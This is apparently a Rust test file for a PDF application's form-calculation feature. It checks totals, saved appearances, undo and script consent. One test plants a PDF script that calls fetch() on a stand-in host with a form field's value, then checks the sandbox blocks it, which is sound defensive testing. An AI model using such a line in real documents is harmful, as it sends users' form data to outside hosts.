// Copyright (c) 2026 Innovation Trigger B.V. All rights reserved.
//
// This software is proprietary. The PDFluent application is free to use,
// including for commercial purposes. Redistribution, or extraction or reuse
// of its components (including the embedded PDF engine), requires a licence.
// See https://pdfluent.com/license for terms.

//! J-57: an AcroForm calculation runs when a field changes. Typing quantity 3
//! and price 4 gives total 12 in the form, and the saved file carries it.
//!
//! The fixture `tests/fixtures/form_calc.pdf` has three text fields, a `/CO`
//! array naming `total`, and a read-only `total` whose `/AA /C` is
//! `AFSimple_Calculate("PRD", new Array("qty", "price"))`.
//!
//! Runs in the `cargo-test` job on Linux, macOS and Windows.

use lopdf::{Document, Object, StringFormat};
use pdfluent_lib::{FormWriteRequest, OpenDocument};
use std::fs;
use std::path::{Path, PathBuf};

const FIXTURE: &str = "tests/fixtures/form_calc.pdf";

fn manifest(rel: &str) -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join(rel)
}

fn scratch(name: &str) -> PathBuf {
    let dir = std::env::temp_dir().join(format!("pdfluent-calc-{}", std::process::id()));
    fs::create_dir_all(&dir).expect("scratch dir");
    dir.join(name)
}

fn path_str(p: &Path) -> &str {
    p.to_str().expect("utf-8 path")
}

/// The form as a user who agreed to its scripts has it. Scripts run only with
/// that agreement (script_consent.rs); the tests below that are about the
/// calculations start here, the ones about the agreement start from
/// `open_without_consent`.
fn open() -> OpenDocument {
    let mut doc = open_without_consent();
    doc.set_scripts_allowed(true).expect("allow scripts");
    doc
}

fn open_without_consent() -> OpenDocument {
    OpenDocument::open(path_str(&manifest(FIXTURE))).expect("open fixture")
}

fn type_into(doc: &mut OpenDocument, name: &str, value: &str) -> pdfluent_lib::FormCalcReport {
    doc.edit("fill-field", |d| {
        d.apply_form_value(&FormWriteRequest::Text { name: name.into(), value: value.into() })
    })
    .unwrap_or_else(|e| panic!("fill {name}: {e}"))
}

fn value_of(doc: &OpenDocument, name: &str) -> Option<String> {
    doc.get_form_model().into_iter().find(|f| f.name == name).and_then(|f| f.value)
}

#[test]
fn quantity_times_price_fills_the_total() {
    let mut doc = open();
    type_into(&mut doc, "qty", "3");
    let report = type_into(&mut doc, "price", "4");

    assert_eq!(value_of(&doc, "total").as_deref(), Some("12"));
    assert_eq!(
        report.updated,
        vec![pdfluent_lib::FormCalcUpdate { name: "total".into(), value: "12".into() }]
    );
    assert!(report.failed.is_empty(), "{:?}", report.failed);
}

#[test]
fn changing_an_input_recalculates_again() {
    let mut doc = open();
    type_into(&mut doc, "qty", "3");
    type_into(&mut doc, "price", "4");
    type_into(&mut doc, "qty", "5");
    assert_eq!(value_of(&doc, "total").as_deref(), Some("20"));
}

#[test]
fn the_saved_file_carries_the_total_and_draws_it() {
    let mut doc = open();
    type_into(&mut doc, "qty", "3");
    type_into(&mut doc, "price", "4");
    let out = scratch("order.pdf");
    doc.save_to(path_str(&out)).expect("save");

    let reopened = OpenDocument::open(path_str(&out)).expect("reopen");
    assert_eq!(value_of(&reopened, "qty").as_deref(), Some("3"));
    assert_eq!(value_of(&reopened, "price").as_deref(), Some("4"));
    assert_eq!(value_of(&reopened, "total").as_deref(), Some("12"));

    // The appearance is in the file, so a viewer that does not calculate
    // still shows 12.
    let raw = Document::load(path_str(&out)).expect("lopdf load");
    let total = raw
        .objects
        .values()
        .filter_map(|o| o.as_dict().ok())
        .find(|d| matches!(d.get(b"T"), Ok(Object::String(t, _)) if t == b"total"))
        .expect("total field");
    let ap = total.get(b"AP").expect("total has an appearance").as_dict().expect("AP dict");
    let normal = match ap.get(b"N").expect("AP /N") {
        Object::Reference(id) => *id,
        other => panic!("AP /N is {other:?}"),
    };
    let Object::Stream(stream) = raw.get_object(normal).expect("stream") else {
        panic!("AP /N is not a stream")
    };
    let content = stream.decompressed_content().unwrap_or_else(|_| stream.content.clone());
    assert!(String::from_utf8_lossy(&content).contains("(12)"), "appearance draws 12");
}

#[test]
fn undo_takes_the_calculated_total_back_with_the_edit() {
    let mut doc = open();
    type_into(&mut doc, "qty", "3");
    type_into(&mut doc, "price", "4");
    assert_eq!(value_of(&doc, "total").as_deref(), Some("12"));
    assert!(doc.undo().expect("undo"));
    assert_eq!(value_of(&doc, "price").as_deref(), Some(""));
    assert_eq!(value_of(&doc, "total").as_deref(), Some("0"), "total as it was after qty alone");
}

/// The fixture with the total's script replaced.
fn with_total_script(script: &str) -> OpenDocument {
    let mut raw = Document::load(path_str(&manifest(FIXTURE))).expect("lopdf load");
    let id = raw
        .objects
        .iter()
        .find(|(_, o)| {
            o.as_dict().is_ok_and(|d| matches!(d.get(b"T"), Ok(Object::String(t, _)) if t == b"total"))
        })
        .map(|(id, _)| *id)
        .expect("total field");
    let Ok(Object::Dictionary(field)) = raw.get_object_mut(id) else { panic!("field dict") };
    let Ok(Object::Dictionary(aa)) = field.get_mut(b"AA") else { panic!("AA") };
    let Ok(Object::Dictionary(c)) = aa.get_mut(b"C") else { panic!("C") };
    c.set("JS", Object::String(script.as_bytes().to_vec(), StringFormat::Literal));
    let mut bytes = Vec::new();
    raw.save_to(&mut bytes).expect("serialise");
    let mut doc = OpenDocument::open_bytes(bytes).expect("open modified fixture");
    doc.set_scripts_allowed(true).expect("allow scripts");
    doc
}

#[test]
fn a_failing_script_is_reported_and_the_edit_stays() {
    let mut doc = with_total_script("AFSimple_Calculate(\"PRD\", new Array(\"qty\", \"missing\"));");
    let report = type_into(&mut doc, "qty", "3");
    assert_eq!(value_of(&doc, "qty").as_deref(), Some("3"), "the typed value is kept");
    assert_eq!(report.failed.len(), 1, "{:?}", report.failed);
    assert_eq!(report.failed[0].name, "total");
    assert!(report.failed[0].message.contains("missing"), "{}", report.failed[0].message);
}

#[test]
fn a_script_cannot_send_the_form_anywhere() {
    let mut doc = with_total_script("fetch('http://example.invalid/?q=' + this.getField('qty').value);");
    let report = type_into(&mut doc, "qty", "3");
    assert_eq!(report.failed.len(), 1, "{:?}", report.failed);
    assert!(report.failed[0].message.contains("fetch"), "{}", report.failed[0].message);
    assert_eq!(value_of(&doc, "total").as_deref(), Some(""));
}

#[test]
fn nothing_is_calculated_without_permission() {
    let mut doc = open_without_consent();
    assert_eq!(value_of(&doc, "total").as_deref(), Some(""), "open runs no script");
    type_into(&mut doc, "qty", "3");
    let report = type_into(&mut doc, "price", "4");
    assert_eq!(value_of(&doc, "qty").as_deref(), Some("3"), "the form can be filled");
    assert_eq!(value_of(&doc, "total").as_deref(), Some(""), "total is not calculated");
    assert!(report.updated.is_empty() && report.failed.is_empty(), "{report:?}");

    let out = scratch("unconsented.pdf");
    doc.save_to(path_str(&out)).expect("save");
    let reopened = OpenDocument::open(path_str(&out)).expect("reopen");
    assert_eq!(value_of(&reopened, "total").as_deref(), Some(""), "save calculated nothing");
}

#[test]
fn permission_given_later_calculates_once_and_the_effect_shows() {
    let mut doc = open_without_consent();
    type_into(&mut doc, "qty", "3");
    type_into(&mut doc, "price", "4");
    assert_eq!(value_of(&doc, "total").as_deref(), Some(""));

    let ran = doc
        .edit("run-form-scripts", |d| d.set_scripts_allowed(true))
        .expect("allow scripts");
    assert!(ran.ran);
    assert_eq!(ran.fields_changed, 1, "the total");
    assert_eq!(value_of(&doc, "total").as_deref(), Some("12"));

    // The effect is one undo step, and undoing it does not take the
    // permission back.
    assert!(doc.undo().expect("undo"));
    assert_eq!(value_of(&doc, "total").as_deref(), Some(""));
    assert!(doc.form_scripts_status().allowed);
}
